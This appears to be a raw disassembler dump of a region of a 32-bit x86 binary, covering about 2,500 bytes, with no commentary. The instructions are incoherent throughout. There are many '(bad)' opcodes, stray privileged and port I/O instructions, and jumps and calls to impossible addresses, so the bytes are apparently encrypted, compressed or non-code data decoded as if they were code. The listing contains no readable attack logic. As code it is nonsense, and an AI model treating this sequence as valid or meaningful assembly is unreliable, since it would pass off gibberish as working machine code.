  42036d:	aaa    
  42036e:	jp     0x4203cc
  420370:	add    DWORD PTR [ecx],0xc6d4e2cd
  420376:	pop    esp
  420377:	push   edx
  420378:	cli    
  420379:	add    DWORD PTR [edi+0x7490a960],ebx
  42037f:	fcmovu st,st(0)
  420381:	leave  
  420382:	icebp  
  420383:	push   edx
  420384:	add    cl,BYTE PTR [eax+ebx*4]
  420387:	lods   al,BYTE PTR ds:[esi]
  420388:	jno    0x4203ea
  42038a:	fst    QWORD PTR [ebx]
  42038c:	call   0xd23df2d6
  420391:	mov    bl,0x1a
  420393:	aad    0x5c
  420395:	test   al,0x93
  420397:	jne    0x420414
  420399:	cmp    eax,0x17819c2e
  42039e:	add    eax,0xc8c8df08
  4203a3:	addr16 jl 0x420422
  4203a6:	push   0x32
  4203a8:	jnp    0x420331
  4203aa:	sub    ebx,DWORD PTR [ebp+0x651f580f]
  4203b0:	mov    ch,0xa7
  4203b2:	and    BYTE PTR [eax+ebp*2+0x6ca0697a],ch
  4203b9:	rcl    BYTE PTR ds:0x4bdbd695,1
  4203bf:	dec    eax
  4203c0:	rol    DWORD PTR [ecx],0xcf
  4203c3:	scas   eax,DWORD PTR es:[edi]
  4203c4:	sbb    bl,BYTE PTR [ebx-0x77]
  4203c7:	dec    ebp
  4203c8:	xchg   DWORD PTR [esi],esi
  4203ca:	data16 mov ah,0x61
  4203cd:	or     edx,DWORD PTR [edx]
  4203cf:	jle    0x4203f1
  4203d1:	inc    ebp
  4203d2:	mov    ds:0xd05c97d9,al
  4203d7:	and    BYTE PTR [edi],al
  4203d9:	push   ss
  4203da:	xor    esp,DWORD PTR [ebp+eax*8-0x3ff2b380]
  4203e1:	jecxz  0x420414
  4203e3:	lea    ecx,[edi-0x3b0b8de1]
  4203e9:	inc    ebp
  4203ea:	into   
  4203eb:	sbb    eax,DWORD PTR [esi]
  4203ed:	ficomp DWORD PTR [esi+0x69d46940]
  4203f3:	xchg   ecx,eax
  4203f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f5:	fnstenv [ebx+0x29c9a163]
  4203fb:	lods   al,BYTE PTR ds:[esi]
  4203fc:	inc    ebp
  4203fd:	pop    ebx
  4203fe:	jmp    0x420462
  420400:	add    BYTE PTR [edx+0x3a610547],al
  420406:	sbb    esp,DWORD PTR [esi+0x918fa06]
  42040c:	jnp    0x4203e8
  42040e:	out    0xbd,eax
  420410:	cmp    eax,ecx
  420412:	out    dx,al
  420413:	add    DWORD PTR [ecx],ecx
  420415:	pop    edi
  420416:	hlt    
  420417:	pop    ecx
  420418:	mov    ds:0xfdaed318,eax
  42041d:	adc    al,0x28
  42041f:	aam    0xf8
  420421:	repnz xor ah,BYTE PTR [edi+ebx*8+0x17]
  420426:	je     0x420408
  420428:	mov    al,0x6b
  42042a:	fxch   st(2)
  42042c:	cs pop edi
  42042e:	test   DWORD PTR [edx-0x2ec0776b],eax
  420434:	pop    esp
  420435:	add    BYTE PTR [ebx+0x25ab0629],al
  42043b:	xchg   esi,edi
  42043d:	xchg   edx,eax
  42043e:	cmp    BYTE PTR [esi],dh
  420440:	scas   al,BYTE PTR es:[edi]
  420441:	jecxz  0x42046b
  420443:	fs ds mov edi,ebp
  420447:	bound  esp,QWORD PTR [ebx]
  420449:	ret    
  42044a:	sar    bh,1
  42044c:	ja     0x420405
  42044e:	in     al,dx
  42044f:	fcomp  DWORD PTR [esi]
  420451:	sbb    eax,0x845ea0d2
  420456:	mov    dl,0x52
  420458:	mov    bh,0xb9
  42045a:	es or  al,0xb
  42045d:	call   0x10e1:0x5dad324c
  420464:	ret    
  420465:	aaa    
  420466:	fimul  WORD PTR [ebx+eiz*4]
  420469:	loope  0x4204d3
  42046b:	nop
  42046c:	pop    ebp
  42046d:	test   al,0xcf
  42046f:	dec    edi
  420470:	leave  
  420471:	cmp    eax,0x3dfbfc6a
  420476:	xor    ah,BYTE PTR ds:0x535260ab
  42047c:	pop    edx
  42047d:	test   BYTE PTR [ecx],0x52
  420480:	lods   eax,DWORD PTR ds:[esi]
  420481:	or     ah,BYTE PTR [ebx-0x30]
  420484:	fild   WORD PTR ds:0xc824426d
  42048b:	jne    0x4204d2
  42048d:	inc    ebp
  42048e:	retf   
  42048f:	ja     0x42050f
  420491:	fld    QWORD PTR [esi]
  420493:	and    dh,BYTE PTR [eax-0x55648219]
  420499:	retf   0x6f6
  42049c:	sbb    al,0xdd
  42049e:	adc    eax,0x5be5cb71
  4204a3:	push   ds
  4204a4:	sbb    DWORD PTR [ebx-0x759ae63f],0x614eb
  4204ae:	dec    ebp
  4204af:	xchg   ebp,eax
  4204b0:	(bad)  
  4204b1:	fild   WORD PTR [edi]
  4204b3:	pop    ebx
  4204b4:	push   ds
  4204b5:	jecxz  0x420461
  4204b7:	jle    0x420529
  4204b9:	or     al,0x87
  4204bb:	outs   dx,BYTE PTR ds:[esi]
  4204bc:	push   edi
  4204bd:	or     ecx,DWORD PTR [ebx+0x20]
  4204c0:	xor    ebx,ebp
  4204c2:	pop    ss
  4204c3:	int    0x47
  4204c5:	(bad)
  4204c8:	mov    edi,0xcafd4b35
  4204cd:	pusha  
  4204ce:	sti    
  4204cf:	scas   al,BYTE PTR es:[edi]
  4204d0:	lock inc eax
  4204d2:	fld    DWORD PTR [edi+0x519e5a6f]
  4204d8:	or     DWORD PTR [eax-0x1b34843a],ebx
  4204de:	mov    edi,0xe3b3c999
  4204e3:	push   0xffffff8b
  4204e5:	pop    ss
  4204e6:	out    0x92,al
  4204e8:	dec    esi
  4204e9:	sbb    cl,BYTE PTR [ebx]
  4204eb:	mov    eax,ds:0xa50b0b62
  4204f0:	loop   0x4204f2
  4204f2:	sti    
  4204f3:	jg     0x4204bd
  4204f5:	repz push ebx
  4204f7:	xchg   BYTE PTR [esp+ebx*8-0x17],bh
  4204fb:	cmp    DWORD PTR [eax+0x1d],edi
  4204fe:	xchg   esi,eax
  4204ff:	mov    ebp,0x4dca8c55
  420504:	test   DWORD PTR [edx-0x6],0x98ad8fc6
  42050b:	pushf  
  42050c:	dec    edx
  42050d:	adc    ah,bh
  42050f:	cdq    
  420510:	mov    ecx,0xf8764bff
  420515:	xchg   DWORD PTR [ebp-0x27],eax
  420518:	addr16 mov esp,0xf8b4bfa2
  42051e:	pop    edx
  42051f:	xor    BYTE PTR [edi+0x30769f7f],dh
  420525:	adc    eax,0x5b700ee
  42052a:	mov    ss,ebp
  42052c:	sub    BYTE PTR ds:0xa8c84b41,dh
  420532:	hlt    
  420533:	sar    esi,cl
  420535:	sbb    esi,DWORD PTR [edx+0x28af779b]
  42053b:	dec    ebp
  42053c:	sbb    ebx,0xffffffe3
  42053f:	ins    DWORD PTR es:[edi],dx
  420540:	pop    ds
  420541:	out    0x22,eax
  420543:	mov    bl,0xcd
  420545:	sub    al,0x18
  420547:	xchg   ebp,eax
  420548:	leave  
  420549:	xchg   DWORD PTR [edi],ebx
  42054b:	adc    bh,dh
  42054d:	cmp    al,0x7f
  42054f:	sub    BYTE PTR [eax],bh
  420551:	mov    eax,ds:0x6b6f811
  420556:	rcl    cl,0x96
  420559:	inc    ebp
  42055a:	sbb    cl,0x3d
  42055d:	jne    0x42053e
  42055f:	ret    0xe0c2
  420562:	shl    DWORD PTR [edx+0x39],0x27
  420566:	in     eax,0x1d
  420568:	jbe    0x42052a
  42056a:	bound  ebp,QWORD PTR [edx-0x29]
  42056d:	iret   
  42056e:	xchg   ebp,eax
  42056f:	cmp    al,BYTE PTR [edi-0x76c10989]
  420575:	sub    ebp,DWORD PTR [ecx]
  420577:	push   0x6a7eecb1
  42057c:	or     esp,DWORD PTR [edx-0x46]
  42057f:	sbb    al,0x22
  420581:	sahf   
  420582:	mov    ds:0xa0ac1386,al
  420587:	mov    dh,0x95
  420589:	mov    cl,0xb8
  42058b:	mov    al,0xb2
  42058d:	pop    ds
  42058e:	mov    eax,0x47823dff
  420593:	lahf   
  420594:	pop    fs
  420596:	popa   
  420597:	xchg   edx,eax
  420598:	cdq    
  420599:	js     0x420554
  42059b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42059c:	pushf  
  42059d:	in     eax,0x20
  42059f:	mov    ebp,0xc9e953fb
  4205a4:	stc    
  4205a5:	cld    
  4205a6:	out    dx,al
  4205a7:	out    dx,al
  4205a8:	inc    eax
  4205a9:	add    al,0x8a
  4205ab:	fbstp  TBYTE PTR [ecx+0x5b]
  4205ae:	popf   
  4205af:	mov    BYTE PTR [ecx],cl
  4205b1:	push   0xffffffe9
  4205b3:	mov    eax,0xa0eb74f6
  4205b8:	and    al,0xd1
  4205ba:	adc    DWORD PTR [eax-0x688dc2e7],0xc7f7a29c
  4205c4:	push   0xffffffc6
  4205c6:	pop    ebx
  4205c7:	xchg   edx,eax
  4205c8:	jl     0x4205fc
  4205ca:	mov    ds:0x5c20dce6,eax
  4205cf:	sbb    bl,BYTE PTR [esi]
  4205d1:	mov    bl,0x14
  4205d3:	loope  0x42062f
  4205d5:	and    al,0x3c
  4205d7:	dec    ebx
  4205d8:	sub    DWORD PTR [edx+0x12],esi
  4205db:	push   ecx
  4205dc:	and    cl,cl
  4205de:	out    dx,eax
  4205df:	pop    edx
  4205e0:	xchg   ebp,eax
  4205e1:	test   DWORD PTR [edi],esp
  4205e3:	pop    ds
  4205e4:	enter  0xd09a,0x8
  4205e8:	fbstp  TBYTE PTR [eax-0x456fb8ab]
  4205ee:	cld    
  4205ef:	cmp    DWORD PTR [esi+edx*4-0x532aaa56],ecx
  4205f6:	call   FWORD PTR [eax+0x5d68b898]
  4205fc:	sub    DWORD PTR [ecx+0xea444c4],0x4a
  420603:	xor    ebp,DWORD PTR [ebp-0x9]
  420606:	imul   ebx,DWORD PTR [ebp+0x24d6eac3],0x1fdeb83c
  420610:	pop    ecx
  420611:	stos   DWORD PTR es:[edi],eax
  420612:	or     DWORD PTR [eax+0x3f8210be],edx
  420618:	inc    esp
  420619:	lock mov ds:0x16a7ae1,eax
  42061f:	fdiv   QWORD PTR fs:[edi+0x5e]
  420623:	xchg   edi,eax
  420624:	stos   DWORD PTR es:[edi],eax
  420625:	outs   dx,DWORD PTR ds:[esi]
	...
  4207ee:	popa   
  4207ef:	push   0xffffffe9
  4207f1:	pop    ss
  4207f2:	jmp    0x42078b
  4207f4:	(bad)  
  4207f5:	jle    0x4207fd
  4207f7:	js     0x4207a6
  4207f9:	aam    0x1b
  4207fb:	inc    eax
  4207fc:	dec    ecx
  4207fd:	retf   0x7dc9
  420800:	add    DWORD PTR [eax],eax
  420802:	push   ds
  420803:	pop    es
  420804:	add    BYTE PTR [eax],al
  420806:	xchg   edx,eax
  420807:	mov    edi,0xff08de64
  42080c:	inc    edi
  42080d:	xor    eax,0xd998babc
  420812:	sub    eax,0x8eca36b0
  420817:	sbb    cl,BYTE PTR [esi+0x6d]
  42081a:	mov    dl,0xdb
  42081c:	pop    eax
  42081d:	dec    ebp
  42081e:	or     bl,ch
  420820:	aam    0xa4
  420822:	cmp    dl,BYTE PTR [ebx-0x2c]
  420825:	jp     0x420852
  420827:	fidivr DWORD PTR ds:0x3cf9b77b
  42082d:	and    edx,DWORD PTR [esi+0x38ead03]
  420833:	imul   ebx,edx,0x3bf1921d
  420839:	dec    edx
  42083a:	and    al,0x3f
  42083c:	sub    dh,BYTE PTR [eax]
  42083e:	mov    esp,0xa2d3fdef
  420843:	aam    0x1
  420845:	sbb    BYTE PTR [ebp+0x6f],al
  420848:	push   0xffffffb2
  42084a:	mov    eax,DWORD PTR [esi]
  42084c:	imul   esp
  42084e:	cmp    edx,DWORD PTR [ecx]
  420850:	jmp    0x54ef4f7e
  420855:	jg     0x4208b8
  420857:	(bad)  
  420858:	shr    BYTE PTR [eax-0x3b],0x62
  42085c:	clc    
  42085d:	mov    eax,ds:0x95434a0a
  420862:	test   eax,0x80bb2a57
  420867:	inc    eax
  420868:	out    0x40,eax
  42086a:	xchg   ebp,eax
  42086b:	xchg   BYTE PTR [eax+0x57],ch
  42086e:	cmp    eax,0x84eee1e1
  420873:	imul   eax,esp,0x71
  420876:	dec    ecx
  420877:	pop    edx
  420878:	rol    bh,1
  42087a:	out    0xd9,eax
  42087c:	push   cs
  42087d:	movntps XMMWORD PTR [ecx],xmm1
  420880:	dec    esi
  420881:	or     eax,0x9c4683cb
  420886:	push   ds
  420887:	push   ds
  420888:	cmp    cl,BYTE PTR [edx+0x482281c9]
  42088e:	int    0x30
  420890:	mov    DWORD PTR [edx],ebp
  420892:	test   BYTE PTR [eax],cl
  420894:	push   0x820b0aa3
  420899:	jb     0x420822
  42089b:	cs jmp 0x4208c1
  42089e:	xor    al,bh
  4208a0:	(bad)  
  4208a1:	jbe    0x4208b8
  4208a3:	xchg   DWORD PTR [ebp+0x53cad3c4],edx
  4208a9:	dec    ecx
  4208aa:	push   0x43
  4208ac:	adc    dh,ch
  4208ae:	mov    WORD PTR [ecx+0x6610c2c1],es
  4208b4:	lea    ebx,[eax-0x62]
  4208b7:	inc    eax
  4208b8:	sbb    bl,BYTE PTR [ebp-0x7a]
  4208bb:	arpl   WORD PTR [edi-0x3f],ax
  4208be:	stos   DWORD PTR es:[edi],eax
  4208bf:	dec    eax
  4208c0:	jp     0x42091d
  4208c2:	xchg   ebp,eax
  4208c3:	aaa    
  4208c4:	add    al,0x4f
  4208c6:	bound  esi,QWORD PTR [esi]
  4208c8:	outs   dx,BYTE PTR ds:[esi]
  4208c9:	mov    al,ds:0xa86b4f8a
  4208ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208cf:	adc    DWORD PTR [edi-0x303f2420],edi
  4208d5:	xor    ecx,DWORD PTR [ecx+edx*1+0x61]
  4208d9:	lods   eax,DWORD PTR ds:[esi]
  4208da:	pop    ds
  4208db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208dc:	xchg   DWORD PTR [ebx-0x4d],edi
  4208df:	ins    DWORD PTR es:[edi],dx
  4208e0:	int3   
  4208e1:	inc    edx
  4208e2:	test   DWORD PTR [eax+0xcc7c490],edx
  4208e8:	jmp    0x420943
  4208ea:	jnp    0x420952
  4208ec:	adc    eax,0x7405ceef
  4208f1:	push   esi
  4208f2:	dec    edx
  4208f3:	push   ss
  4208f4:	fsub   DWORD PTR [ebx-0x4a8ba50c]
  4208fa:	(bad)  
  4208fb:	xchg   ebp,eax
  4208fc:	in     al,0x5b
  4208fe:	sbb    al,0xd
  420900:	call   0x26428ba2
  420905:	add    eax,0x136e25e4
  42090a:	mov    ebx,DWORD PTR [edi+ebx*4]
  42090d:	clc    
  42090e:	lock pop ecx
  420910:	and    BYTE PTR [edx+0x64d86922],0x3c
  420917:	xor    ecx,DWORD PTR [ebp-0x1f]
  42091a:	mov    cl,0xf
  42091c:	scas   al,BYTE PTR es:[edi]
  42091d:	jb     0x42097f
  42091f:	(bad)  
  420920:	push   ebx
  420921:	mov    al,0xd2
  420923:	pop    edi
  420924:	call   0x3b16c85e
  420929:	out    0xe8,eax
  42092b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42092c:	ficomp WORD PTR [edx]
  42092e:	leave  
  42092f:	or     ch,BYTE PTR [esi-0x79]
  420932:	ror    eax,cl
  420934:	daa    
  420935:	inc    edx
  420936:	out    0xdb,eax
  420938:	cmp    DWORD PTR [ebx],0xa4f3df81
  42093e:	jp     0x420979
  420940:	xor    DWORD PTR [ecx-0x6cfaaeae],ecx
  420946:	outs   dx,BYTE PTR ds:[esi]
  420947:	shr    BYTE PTR [eax-0x2a],1
  42094a:	fneni(8087 only) 
  42094c:	lods   al,BYTE PTR ds:[esi]
  42094d:	and    bl,BYTE PTR [edi-0x64]
  420950:	xchg   dh,dh
  420952:	outs   dx,BYTE PTR ds:[esi]
  420953:	jb     0x420951
  420955:	stos   BYTE PTR es:[edi],al
  420956:	push   ss
  420957:	test   DWORD PTR [eax-0x5fd77bb7],ebx
  42095d:	inc    edx
  42095e:	ret    0x9f43
  420961:	stos   BYTE PTR es:[edi],al
  420962:	mov    esi,0xfdb4e65d
  420967:	pop    edi
  420968:	popa   
  420969:	inc    eax
  42096a:	shl    DWORD PTR [esi],cl
  42096c:	push   ecx
  42096d:	or     dl,al
  42096f:	cmp    eax,0x392be977
  420974:	jmp    DWORD PTR [edx]
  420976:	repnz and bh,al
  420979:	pushf  
  42097a:	pushf  
  42097b:	or     al,0x4b
  42097d:	nop
  42097e:	cmc    
  42097f:	(bad)  
  420980:	test   al,0x47
  420982:	mov    dl,0x7e
  420984:	fwait
  420985:	std    
  420986:	stos   DWORD PTR es:[edi],eax
  420987:	add    edi,DWORD PTR [edi]
  420989:	mov    BYTE PTR [ecx],bl
  42098b:	sub    DWORD PTR [ebp-0x1c24610f],0x6f9a4f5e
  420995:	mov    dh,0x4b
  420997:	sub    al,0xc6
  420999:	push   0xfd3039bc
  42099e:	inc    esp
  42099f:	xor    DWORD PTR [ebx+0x4a21527a],ecx
  4209a5:	sets   BYTE PTR [edx+0x18]
  4209a9:	scas   eax,DWORD PTR es:[edi]
  4209aa:	aad    0x99
  4209ac:	call   0xcd3:0x2d4bb6e
  4209b3:	dec    ebx
  4209b4:	pop    ss
  4209b5:	sub    BYTE PTR [ebx+0x37],al
  4209b8:	outs   dx,DWORD PTR ds:[esi]
  4209b9:	and    DWORD PTR [edx],esp
  4209bb:	sbb    DWORD PTR [eax-0x4b0db1b9],0xffffffed
  4209c2:	es push ebp
  4209c4:	jo     0x420a33
  4209c6:	ds pop es
  4209c8:	retf   
  4209c9:	repnz fadd st,st(6)
  4209cc:	div    BYTE PTR [ecx+0x2d]
  4209cf:	adc    DWORD PTR [eax-0x63],esi
  4209d2:	add    al,0xc
  4209d4:	push   0xffffffa8
  4209d6:	jne    0x420966
  4209d8:	out    0x84,eax
  4209da:	fs adc al,0xf1
  4209dd:	iret   
  4209de:	das    
  4209df:	inc    ecx
  4209e0:	rcl    BYTE PTR [edi],0xb9
  4209e3:	xor    al,0x5c
  4209e5:	mov    ecx,0xf5bc1820
  4209ea:	shl    DWORD PTR [ecx-0x368c17e5],cl
  4209f0:	add    eax,0xea613299
  4209f5:	or     eax,0x86c6a3b4
  4209fa:	int    0xf1
  4209fc:	pusha  
  4209fd:	mov    eax,ds:0x6b69f79a
  420a02:	(bad)  
  420a03:	jns    0x4209b7
  420a05:	or     eax,0xb434288e
  420a0a:	sub    bh,BYTE PTR [ebp+ebx*4-0x79bcb223]
  420a11:	pop    edi
  420a12:	les    eax,FWORD PTR [ebx+0x2d]
  420a15:	sub    dl,BYTE PTR [esi-0x5e]
  420a18:	test   al,0x63
  420a1a:	jl     0x4209f8
  420a1c:	bound  ebp,QWORD PTR [edi-0x1328dee6]
  420a22:	mov    edi,0x40a7161e
  420a27:	jle    0x420a38
  420a29:	jmp    0x4312:0xc9429f01
  420a30:	pop    ebx
  420a31:	imul   eax,DWORD PTR [edx+0x59124536],0x53
  420a38:	cdq    
  420a39:	out    0xcd,eax
  420a3b:	cli    
  420a3c:	sbb    eax,DWORD PTR [ebp+eax*2+0x21449ef6]
  420a43:	in     eax,dx
  420a44:	lahf   
  420a45:	xor    BYTE PTR [edi+eiz*1],dh
  420a48:	pushf  
  420a49:	outs   dx,BYTE PTR ds:[esi]
  420a4a:	int    0x36
  420a4c:	jne    0x420aac
  420a4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a4f:	mov    ds:0x46ddfc1,al
  420a54:	out    0x32,al
  420a56:	or     BYTE PTR [ebx],0xfe
  420a59:	and    edi,DWORD PTR [esi]
  420a5b:	push   esp
  420a5c:	mov    ch,0x7d
  420a5e:	push   es
  420a5f:	xlat   BYTE PTR ds:[ebx]
  420a60:	and    eax,0x47462a5f
  420a65:	inc    ecx
  420a66:	xchg   BYTE PTR [eax],ah
  420a68:	ds mov al,0xaf
  420a6b:	fdivr  DWORD PTR [ebp-0x793c0a7f]
  420a71:	cmp    bh,BYTE PTR [edi+eax*4+0x701d7d1a]
  420a78:	xchg   DWORD PTR [eax-0x6d],ecx
  420a7b:	cwde   
  420a7c:	add    ebp,DWORD PTR [ecx+0x4d]
  420a7f:	rcl    BYTE PTR [edi+edx*2+0x59e18abc],1
  420a86:	adc    al,0x4
  420a88:	mov    esi,0x6bfa1123
  420a8d:	aad    0x15
  420a8f:	fbld   TBYTE PTR [ebp+0x39]
  420a92:	into   
  420a93:	fwait
  420a94:	jnp    0x420aa2
  420a96:	cmp    al,0x42
  420a98:	xchg   ebx,eax
  420a99:	test   BYTE PTR [edi+ebx*2-0x24],ch
  420a9d:	or     edi,DWORD PTR [ecx-0x19cd2e39]
  420aa3:	mov    BYTE PTR [ebp+0x4d],cl
  420aa6:	shl    BYTE PTR [edi+0x31],0xf9
  420aaa:	jbe    0x420a4d
  420aac:	popf   
  420aad:	xchg   bl,bl
  420aaf:	push   edx
  420ab0:	out    0x24,eax
  420ab2:	push   esi
  420ab3:	out    dx,al
  420ab4:	and    al,0x40
  420ab6:	xchg   ebx,eax
  420ab7:	(bad)  
  420ab8:	jmp    0xfbacf0e5
  420abd:	inc    edi
  420abe:	shl    BYTE PTR [eax-0x76],cl
  420ac1:	stos   BYTE PTR es:[edi],al
  420ac2:	xchg   esp,eax
  420ac3:	mov    bh,0x84
  420ac5:	call   0xcf54f6cb
  420aca:	inc    esp
  420acb:	pop    esi
  420acc:	push   0xffffffff
  420ace:	push   esi
  420acf:	dec    ebp
  420ad0:	sbb    eax,DWORD PTR [ecx+0x3]
  420ad3:	fcom   QWORD PTR [ecx-0x136aadc3]
  420ad9:	popf   
  420ada:	push   edi
  420adb:	(bad)  
  420adc:	jl     0x420a8a
  420ade:	js     0x420aef
  420ae0:	adc    BYTE PTR [edx],ah
  420ae2:	dec    esi
  420ae3:	and    eax,0x5fa6d734
  420ae8:	cmp    ah,BYTE PTR [ecx]
  420aea:	jmp    0xf869:0xbfc370eb
  420af1:	test   eax,0x5c0ca25e
  420af6:	jmp    0x420aab
  420af8:	pop    edx
  420af9:	pusha  
  420afa:	ror    DWORD PTR [edi-0xe],cl
  420afd:	ret    
  420afe:	add    BYTE PTR [esi-0x7],ch
  420b01:	out    dx,eax
  420b02:	lea    eax,[ebp-0x3e]
  420b05:	fistp  WORD PTR [edx+0x5205a527]
  420b0b:	push   cs
  420b0c:	adc    eax,0x67d0ebe3
  420b11:	arpl   WORD PTR [edx+0x1c],sp
  420b14:	fisttp DWORD PTR [eax-0x732bf668]
  420b1a:	jb     0x420b82
  420b1c:	daa    
  420b1d:	stos   BYTE PTR es:[edi],al
  420b1e:	inc    ebp
  420b1f:	pop    edx
  420b20:	(bad)  
  420b21:	call   0xc50ab4c8
  420b26:	punpcklwd mm5,DWORD PTR [edx]
  420b29:	push   ds
  420b2a:	or     BYTE PTR [edx],bl
  420b2c:	popf   
  420b2d:	ret    0x74d6
  420b30:	push   esi
  420b31:	jmp    0x4d6b3936
  420b36:	fs xchg esi,eax
  420b38:	rcr    DWORD PTR [esi],0xe4
  420b3b:	xor    BYTE PTR cs:[eax+0x301363dd],0x6a
  420b43:	shr    ch,0x9a
  420b46:	mov    eax,esp
  420b48:	and    edx,DWORD PTR [esi+0x18]
  420b4b:	xor    DWORD PTR [esi],edi
  420b4d:	cmp    BYTE PTR [esp+esi*4-0x77],bl
  420b51:	push   0x591cae2a
  420b56:	cmp    ah,BYTE PTR [ebx]
  420b58:	test   DWORD PTR [edx],esp
  420b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b5b:	sbb    eax,DWORD PTR [ebx+0x9609281]
  420b61:	cld    
  420b62:	int    0xbf
  420b64:	loop   0x420bbf
  420b66:	aaa    
  420b67:	test   DWORD PTR [esi+0xf],0x8c9edd78
  420b6e:	imul   edi,DWORD PTR [ebp-0x3],0x99deab2f
  420b75:	dec    esi
  420b76:	pop    edi
  420b77:	or     esp,edx
  420b79:	push   edx
  420b7a:	sub    al,bl
  420b7c:	scas   al,BYTE PTR es:[edi]
  420b7d:	ficom  DWORD PTR [ebx]
  420b7f:	xchg   ecx,eax
  420b80:	repnz mov eax,ds:0xc092a033
  420b86:	out    0x1,al
  420b88:	cmp    esi,DWORD PTR ds:0x777b4387
  420b8e:	add    eax,0x779b91f5
  420b93:	add    bh,BYTE PTR [eax-0x3]
  420b96:	nop
  420b97:	int3   
  420b98:	push   edi
  420b99:	mov    WORD PTR fs:[edi+0xf],es
  420b9d:	mov    al,ds:0x1f827c1a
  420ba2:	jecxz  0x420bdd
  420ba4:	jo     0x420ba3
  420ba6:	jp     0x420b8d
  420ba8:	mov    al,0x82
  420baa:	push   0xffffff81
  420bac:	je     0x420b85
  420bae:	inc    ecx
  420baf:	sar    BYTE PTR [esi+0x26],0xa8
  420bb3:	ret    0x720e
  420bb6:	sbb    eax,0x7e16931b
  420bbb:	or     al,bh
  420bbd:	lods   al,BYTE PTR ds:[esi]
  420bbe:	dec    esi
  420bbf:	add    al,0x1e
  420bc1:	mov    al,ds:0x3a7553ca
  420bc6:	in     al,dx
  420bc7:	into   
  420bc8:	jmp    0x420b9a
  420bca:	ror    BYTE PTR [eax-0x13],cl
  420bcd:	mov    ecx,0x4d693fe9
  420bd2:	icebp  
  420bd3:	pop    esi
  420bd4:	mov    ebx,0x370fbe58
  420bd9:	popf   
  420bda:	into   
  420bdb:	(bad)  
  420bdc:	cmc    
  420bdd:	mov    ebp,DWORD PTR [edi+0x37377f4e]
  420be3:	adc    al,0x50
  420be5:	in     al,0xd1
  420be7:	std    
  420be8:	out    0x5a,al
  420bea:	lds    eax,FWORD PTR [eax-0x31c963cb]
  420bf0:	pop    es
  420bf1:	pushf  
  420bf2:	xchg   ebx,eax
  420bf3:	outs   dx,DWORD PTR ds:[esi]
  420bf4:	add    al,0x67
  420bf6:	push   edx
  420bf7:	mov    WORD PTR [eax-0x35990478],?
  420bfd:	mov    ch,ch
  420bff:	push   esp
  420c00:	je     0x420baa
  420c02:	mov    dl,bh
  420c04:	std    
  420c05:	mov    edx,0x20099cca
  420c0a:	mov    ebx,0x54b48849
  420c0f:	inc    edx
  420c10:	xor    cl,bl
  420c12:	sub    DWORD PTR [ebp-0x17],edx
  420c15:	mov    ch,0x44
  420c17:	(bad)
  420c1b:	test   eax,0x2d24b54a
  420c20:	cmp    eax,0x8b84ce98
  420c25:	gs jno 0x420c5e
  420c28:	pop    ebp
  420c29:	inc    ebx
  420c2b:	ins    DWORD PTR es:[edi],dx
  420c2c:	or     ah,BYTE PTR [edx+0x1d87d8e7]
  420c32:	mov    cl,0x6f
  420c34:	mov    ds,edx
  420c36:	push   ss
  420c37:	pushw  ss
  420c39:	xor    al,0x5b
  420c3b:	xor    BYTE PTR [ebp-0x62b94dff],0x3d
  420c42:	jb     0x420bd6
  420c44:	inc    edx
  420c45:	mov    edi,esi
  420c47:	jns    0x420bd0
  420c49:	and    BYTE PTR [edi],dl
  420c4b:	mov    al,0xac
  420c4d:	jecxz  0x420c50
  420c4f:	(bad)  
  420c50:	cli    
  420c51:	mov    ds:0xc136c13c,al
  420c56:	outs   dx,DWORD PTR ds:[esi]
  420c57:	lock pop ebp
  420c59:	int    0x55
  420c5b:	outs   dx,DWORD PTR ds:[esi]
  420c5c:	stc    
  420c5d:	jmp    0x420c6f
  420c5f:	pop    ebx
  420c60:	mov    dh,0x25
  420c62:	xchg   DWORD PTR [esi+0xaf116d5],ebp
  420c68:	jb     0x420c5f
  420c6a:	mov    esi,0x4e4a1257
  420c6f:	inc    BYTE PTR [eax-0x43b4bcc8]
  420c75:	and    DWORD PTR [ebp+0x7046d2e1],esi
  420c7b:	enter  0x2977,0x14
  420c7f:	(bad)  
  420c80:	into   
  420c81:	lock (bad) 
  420c83:	(bad)  
  420c84:	aam    0xc7
  420c86:	int    0x5e
  420c88:	mov    ebx,0x102ee957
  420c8d:	(bad)  
  420c8e:	push   0xfb6c11fe
  420c93:	push   ebp
  420c94:	scas   al,BYTE PTR es:[edi]
  420c95:	lods   al,BYTE PTR ds:[esi]
  420c96:	or     DWORD PTR [edi],ecx
  420c98:	inc    edi
  420c99:	repz aam 0x8b
  420c9c:	out    dx,eax
  420c9d:	mov    ch,BYTE PTR [edi+0x3ecf66db]
  420ca3:	mov    dh,BYTE PTR [esi]
  420ca5:	and    DWORD PTR [esi+0x15174f3b],edi
  420cab:	popf   
  420cac:	shl    DWORD PTR [ebp+0x417506a0],cl
  420cb2:	mov    bh,0xb1
  420cb4:	(bad)  
  420cb5:	cmp    ah,ch
  420cb7:	add    BYTE PTR [esi-0x5a2cc085],0xd9
  420cbe:	xchg   esi,eax
  420cbf:	sub    edi,DWORD PTR [edi-0x361a74ec]
  420cc5:	iret   
  420cc6:	hlt    
  420cc7:	scas   eax,DWORD PTR es:[edi]
  420cc8:	pop    ds
  420cc9:	bound  ebx,QWORD PTR [edi+0x74]
  420ccc:	or     eax,0xd2b9d277
  420cd1:	test   edx,edx
  420cd3:	jno    0x420c7f
  420cd5:	or     DWORD PTR [esi],ecx
  420cd7:	repz test dl,ch
  420cda:	sbb    eax,0xe6471997
  420cdf:	pop    eax
  420ce0:	(bad)  
  420ce1:	retf   0x9881
  420ce4:	cld    
  420ce5:	sub    al,0xfa
  420ce7:	cdq    
  420ce8:	popa   
  420ce9:	rcr    BYTE PTR [esp+eiz*2+0x66],1
  420ced:	clc    
  420cee:	mov    esp,edi
  420cf0:	repz out dx,al
  420cf2:	repz xchg ecx,eax
  420cf4:	adc    eax,0xa5e5003f
  420cf9:	inc    ecx
  420cfa:	pusha  
  420cfb:	retf   
  420cfc:	(bad)  
  420cfd:	iret   
  420cfe:	ja     0x420d6a
  420d00:	shl    BYTE PTR [ecx+eax*4-0x7942a225],0x59
  420d08:	out    0x79,al
  420d0a:	add    al,0x8e
